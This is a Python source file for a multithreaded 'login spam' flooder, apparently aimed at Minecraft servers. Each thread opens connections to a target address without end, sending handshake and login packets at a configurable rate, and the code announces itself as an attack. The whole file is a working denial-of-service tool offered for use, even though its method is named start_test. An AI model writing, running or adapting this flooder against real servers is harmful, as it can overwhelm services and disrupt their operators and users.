import socket
import threading
import time
from multiprocessing.pool import ThreadPool
from .handshake_packet import HandshakePacket
from .login_packet import LoginPacket


class LoginSpam:

    def start_test(self):
        try:
            handshake_packet = HandshakePacket(self.protocol, self.address, self.port, 2).get_packet()
            while True:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect((self.address, self.port))
                server.send(handshake_packet)
                server.send(LoginPacket("mc").get_packet())
                server.close()
                self.packets += 1
                if self.pps != -1 and self.pps > 0:
                    time.sleep(1/self.pps)
        except Exception as e:
            print("Some issue: ", e, ". Reactivating")
            self.start_test()

    def kill_timeout(self):
        print("In total sent over", self.packets, "packets")
        raise SystemExit

    def __init__(self, duration, threads, address, port, pps, protocol):
        self.packets = 0
        self.address = address
        self.port = port
        self.pps = pps
        self.protocol = protocol
        pool = ThreadPool(processes=threads)
        print("Starting attack by login spam packet method")
        for threads in range(threads):
            pool.apply_async(self.start_test)
        threading.Timer(duration, self.kill_timeout).start()
